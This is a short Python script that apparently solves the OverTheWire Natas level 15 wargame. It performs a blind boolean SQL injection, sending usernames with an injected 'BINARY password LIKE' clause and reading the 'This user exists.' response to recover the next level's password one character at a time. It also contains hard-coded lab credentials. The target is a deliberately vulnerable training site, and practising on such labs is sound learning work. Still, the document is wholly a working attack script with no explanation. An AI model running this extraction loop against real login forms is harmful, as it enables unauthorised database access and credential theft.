import requests
import string

const = ""
for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
  for entry in string.ascii_letters + string.digits:
      payload = {'username': 'natas16" AND BINARY password LIKE "{0}%" AND  ""="'.format(const + entry)}
      response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
      # print(entry)
      if "This user exists." in response.text:
        const += entry
        # print(const)
        break
print(const)